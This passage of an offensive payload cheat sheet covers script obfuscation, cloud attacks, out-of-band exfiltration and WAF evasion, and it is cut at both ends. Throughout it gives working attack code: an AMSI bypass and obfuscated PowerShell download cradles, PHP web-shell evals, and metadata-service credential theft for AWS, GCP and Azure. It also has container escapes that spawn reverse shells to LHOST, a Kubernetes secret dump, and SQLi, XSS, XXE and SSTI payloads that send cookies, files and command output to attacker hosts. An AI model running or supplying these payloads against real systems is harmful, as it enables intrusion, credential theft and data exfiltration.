c = compile(code, '<s>', 'exec')
m = marshal.dumps(c)
z = zlib.compress(m)
b = base64.b64encode(z).decode()
print(f"import base64,marshal,zlib; exec(marshal.loads(zlib.decompress(base64.b64decode('{b}'))))")

# Layer 3: chr() encoding
code = "import os; os.system('id')"
chars = '+'.join([f'chr({ord(c)})' for c in code])
print(f"exec({chars})")
```

### 13.3 PowerShell Obfuscation

```powershell
# AMSI bypass (in-memory patch)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Base64 encode payload
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://LHOST/shell.ps1")'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc BASE64_RESULT

# String split obfuscation
$a = "IE"; $b = "X "; $c = "(New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')"
Invoke-Expression ($a+$b+$c)

# Backtick insertion (bypasses simple string matching)
I`E`X (N`ew-O`bject Net.W`ebClient).DownloadString('http://LHOST/shell.ps1')

# Environment variable concatenation
$env:TEMP = "IEX"; Invoke-Expression ($env:TEMP + " (New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')")

# Char code array
[char[]](73,69,88,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,76,72,79,83,84,47,115,104,101,108,108,46,112,115,49,39,41) -join '' | IEX
```

### 13.4 PHP Obfuscation

```php
// Base64 chain
eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw=='));

// gzinflate + base64
eval(gzinflate(base64_decode('...')));

// str_rot13
eval(str_rot13('flfgrz($_TRG[\'p\']);'));

// Hex strings
eval(hex2bin('73797374656d28245f4745545b2763275d293b'));

// chr() array
$f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$f($_GET['c']);

// call_user_func + array_map
call_user_func(base64_decode('c3lzdGVt'), $_GET['c']);
```

### 13.5 JavaScript Obfuscation

```javascript
// JSFuck — all JS using only []()!+
// Use: https://jsfuck.com/ or jsfuck npm package
// alert(1) in JSFuck:
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]])()+[])

// Simpler eval obfuscation
var _0x1a2b=["\x61\x6C\x65\x72\x74","\x48\x65\x6C\x6C\x6F"];window[_0x1a2b[0]](_0x1a2b[1])
```

---

## Section 14 — Cloud-Specific Payloads

### 14.1 AWS

```bash
# IMDSv1 credential theft (one-liner, via SSRF or shell access)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | \
  xargs -I{} curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/{}" | \
  python3 -m json.tool

# IMDSv2 credential theft (two steps)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: $TOKEN")
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" \
  -H "X-aws-ec2-metadata-token: $TOKEN" | python3 -m json.tool

# Use stolen credentials
export AWS_ACCESS_KEY_ID=ASIAXXX
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx
aws sts get-caller-identity
aws s3 ls
aws iam list-users 2>/dev/null
aws ec2 describe-instances 2>/dev/null
aws secretsmanager list-secrets 2>/dev/null
aws ssm describe-parameters 2>/dev/null
aws lambda list-functions 2>/dev/null

# S3 bucket enumeration with credentials
aws s3 ls s3://discovered-bucket/ --no-sign-request
aws s3 cp s3://discovered-bucket/ /tmp/s3_loot/ --recursive --no-sign-request

# SSM Run Command (RCE on EC2 if SSM permissions)
INSTANCE_ID=$(aws ec2 describe-instances --query 'Reservations[0].Instances[0].InstanceId' --output text)
aws ssm send-command --document-name "AWS-RunShellScript" \
  --targets "Key=instanceids,Values=$INSTANCE_ID" \
  --parameters 'commands=["bash -i >& /dev/tcp/LHOST/LPORT 0>&1"]'
```

### 14.2 GCP

```bash
# GCP metadata credential theft
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" | python3 -m json.tool

# Use token
GCP_TOKEN=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# GCP API calls with token
curl -s "https://www.googleapis.com/compute/v1/projects/PROJECT/zones" \
  -H "Authorization: Bearer $GCP_TOKEN"

# GCS bucket access
curl -s "https://storage.googleapis.com/storage/v1/b/BUCKET/o" \
  -H "Authorization: Bearer $GCP_TOKEN"

# Cloud Run RCE (if Function URL found and misconfigured)
curl -sk "https://REGION-PROJECT.cloudfunctions.net/FUNCTION" \
  -H "Authorization: Bearer $GCP_TOKEN" \
  -X POST -d '{"cmd":"id"}'
```

### 14.3 Azure

```bash
# Azure IMDS credential theft
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true" | python3 -m json.tool

AZURE_TOKEN=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# List subscriptions
curl -s "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  -H "Authorization: Bearer $AZURE_TOKEN" | python3 -m json.tool

# List resource groups
curl -s "https://management.azure.com/subscriptions/SUBSCRIPTION_ID/resourceGroups?api-version=2021-04-01" \
  -H "Authorization: Bearer $AZURE_TOKEN" | python3 -m json.tool

# Access Key Vault (if permissions)
curl -s "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.3" \
  -H "Authorization: Bearer $(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/' -H 'Metadata: true' | python3 -c 'import sys,json; print(json.load(sys.stdin)[\"access_token\"])')"
```

### 14.4 Container Escape

```bash
# Check if in container
cat /proc/1/cgroup | grep -qE "docker|kubepods" && echo "IN CONTAINER"
ls /.dockerenv 2>/dev/null && echo "Docker container"

# Docker socket escape (most common)
ls -la /var/run/docker.sock 2>/dev/null
curl -s --unix-socket /var/run/docker.sock http://d/containers/json | python3 -m json.tool | head -30
# Create privileged container mounting host fs
curl -s --unix-socket /var/run/docker.sock \
  -X POST -H "Content-Type: application/json" \
  http://d/containers/create \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host /bin/bash -c \"id && cat /etc/shadow && bash -i >& /dev/tcp/LHOST/LPORT 0>&1\""],"Binds":["/:/host"],"Privileged":true}' | \
  python3 -c "import sys,json; cid=json.load(sys.stdin)['Id']; print(cid)"
# Start: curl -s --unix-socket /var/run/docker.sock -X POST http://d/containers/CID/start

# Privileged container escape via cgroup (CVE-2022-0492)
cat /proc/self/status | grep "CapEff"
# If CapEff has 0000003fffffffff or similar high value = privileged
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1\n' > /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Kubernetes service account token abuse (from inside pod)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc
curl -s $APISERVER/api --cacert $CACERT -H "Authorization: Bearer $TOKEN" | jq .
curl -s $APISERVER/api/v1/namespaces/default/secrets --cacert $CACERT -H "Authorization: Bearer $TOKEN" | jq '.items[].metadata.name'
# Dump all secrets
curl -s $APISERVER/api/v1/secrets --cacert $CACERT -H "Authorization: Bearer $TOKEN" | \
  python3 -c "import sys,json,base64
data=json.load(sys.stdin)
for item in data.get('items',[]):
    print(f\"--- {item['metadata']['namespace']}/{item['metadata']['name']} ---\")
    for k,v in item.get('data',{}).items():
        try: print(f'  {k}: {base64.b64decode(v).decode()}')
        except: print(f'  {k}: {v}')
"
```

---

## Section 15 — Blind / OOB Payload Templates

### 15.1 interactsh Setup

```bash
# interactsh-client (Burp Collaborator replacement, self-contained)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start listener — gives you a unique OOB domain
interactsh-client -v 2>&1 &
# Output: Registered interactsh session: abcdef1234.oast.fun
OOB="abcdef1234.oast.fun"

# Or use hosted: https://app.interactsh.com (web UI, no install)
# Or: canarytokens.org for quick DNS/HTTP callbacks
```

### 15.2 Blind SQLi OOB

```sql
-- MySQL DNS exfil (requires FILE privilege + outbound DNS)
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.OOBHOST/share'))-- -
1 AND LOAD_FILE(CONCAT('\\\\',HEX(database()),'.OOBHOST/x'))-- -

-- MySQL HTTP (via UDF — rare, but when present)
SELECT sys_eval(CONCAT('curl -d "d=',hex(database()),'" http://OOBHOST/'));

-- MSSQL DNS (no special privileges needed!)
1; EXEC master..xp_dirtree '\\OOBHOST\x'-- -
1; EXEC master..xp_fileexist '\\OOBHOST\x'-- -
-- MSSQL HTTP
1; EXEC master..xp_cmdshell 'powershell -c "Invoke-WebRequest http://OOBHOST/?d=(whoami)"'-- -

-- Oracle HTTP via UTL_HTTP
1 UNION SELECT UTL_HTTP.REQUEST('http://OOBHOST/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM DUAL--
-- Oracle DNS via UTL_INADDR
1 UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.OOBHOST') FROM DUAL--
```

### 15.3 Blind CMDi OOB

```bash
# DNS callback (works even through most egress filters)
; nslookup `id`.OOBHOST
; ping -c 1 `id`.OOBHOST
$(nslookup `whoami`.OOBHOST)
`curl http://OOBHOST/cmd=$(id|base64)`
; wget "http://OOBHOST/?d=$(id|base64)"

# Multi-word exfil via DNS (handles spaces in output)
OUTPUT=$(id); nslookup ${OUTPUT// /_}.OOBHOST

# Time-based blind CMDi detection
; sleep 5
| timeout 5 sleep 5
& ping -n 5 127.0.0.1
```

### 15.4 Blind SSRF OOB

```bash
# Basic OOB SSRF detection — inject into every URL/file/path parameter
# Use interactsh domain as the target URL in the SSRF parameter:
url=http://OOBHOST/ssrf-test
dest=http://OOBHOST/ssrf-test
redirect=http://OOBHOST/ssrf-test
fetch=http://OOBHOST/ssrf-test
image=http://OOBHOST/ssrf-test
proxy=http://OOBHOST/ssrf-test

# Full automated probe
python3 << 'EOF'
import requests, urllib3
urllib3.disable_warnings()

TARGET = "https://target.com/api/fetch"
OOB = "abcdef1234.oast.fun"
PARAMS = ["url","uri","dest","redirect","fetch","path","link","proxy","target","endpoint","next","return","callback","image","src","href","source","load","page","file","document","resource","host"]

s = requests.Session()
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

for param in PARAMS:
    for method, kwargs in [
        ("GET",  {"params": {param: f"http://{OOB}/{param}-get"}}),
        ("POST", {"data":   {param: f"http://{OOB}/{param}-post"}}),
        ("POST", {"json":   {param: f"http://{OOB}/{param}-json"}}),
    ]:
        try:
            r = getattr(s, method.lower())(TARGET, **kwargs, timeout=10)
            if r.status_code not in (404, 400, 0):
                print(f"[{r.status_code}] {method} {param} — watch OOB for callback")
        except: pass
EOF
```

### 15.5 Blind XSS OOB

```javascript
// Payload to inject into stored fields (names, addresses, comments, tickets, logs)
// When rendered by admin/staff, fires and reports back

// Method 1: script tag (most reliable)
<script src="https://OOBHOST/xss.js"></script>

// Method 2: img onerror (if script blocked)
<img src=x onerror="var s=document.createElement('script');s.src='https://OOBHOST/xss.js';document.head.appendChild(s)">

// Method 3: fetch (modern browsers)
<img src=x onerror="fetch('https://OOBHOST/xss?u='+btoa(location.href)+'&c='+btoa(document.cookie))">

// xss.js — serve on OOBHOST (python3 -m http.server 80)
// Captures everything:
var data = {
    url: window.location.href,
    title: document.title,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    dom: btoa(unescape(encodeURIComponent(document.documentElement.outerHTML)))
};
fetch('https://OOBHOST/catch', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
});
```

### 15.6 Blind XXE OOB

```xml
<!-- Step 1: Inject this into the XML input -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://OOBHOST/evil.dtd">
  %xxe;
]>
<data>&exfil;</data>
```

```xml
<!-- Step 2: evil.dtd served on OOBHOST (python3 -m http.server 80) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://OOBHOST/?data=%file;'>">
%payload;
```

```bash
# Serve DTD and capture exfil
python3 -c "
import http.server, urllib.parse

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/evil.dtd':
            dtd = b'''<!ENTITY % file SYSTEM \"file:///etc/passwd\">
<!ENTITY % payload \"<!ENTITY exfil SYSTEM \\'http://LHOST/?data=%file;\\'>\" >
%payload;'''
            self.send_response(200)
            self.send_header('Content-type','text/xml')
            self.end_headers()
            self.wfile.write(dtd)
        else:
            data = urllib.parse.unquote(self.path)
            print('[+] Received:', data)
            open('/tmp/xxe_data.txt','a').write(data+'\n')
            self.send_response(200); self.end_headers()
    def log_message(self, *args): pass

http.server.HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
"
```

### 15.7 Blind SSTI OOB

```
# Test if SSTI exists via time delay:
{% for i in range(1000000) %}{% endfor %}  (Jinja2 — slow = SSTI exists)

# OOB HTTP callback via SSTI:
# Jinja2:
{{config.__class__.__init__.__globals__['os'].popen('curl http://OOBHOST/ssti-rce').read()}}

# FreeMarker:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://OOBHOST/freemarker-rce")}

# ERB:
<%= `curl http://OOBHOST/erb-rce` %>
```

---

## Section 16 — WAF Evasion

### 16.1 HTTP-Level Bypass

```bash
# Chunked transfer encoding (bypass body inspection)
curl -sk -X POST "https://target.com/api" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'5\r\nhello\r\n0\r\n\r\n'

# Case variation in headers
curl -sk "https://target.com/" \
  -H "cOnTeNt-TyPe: application/json"

# Double Content-Type (some WAFs only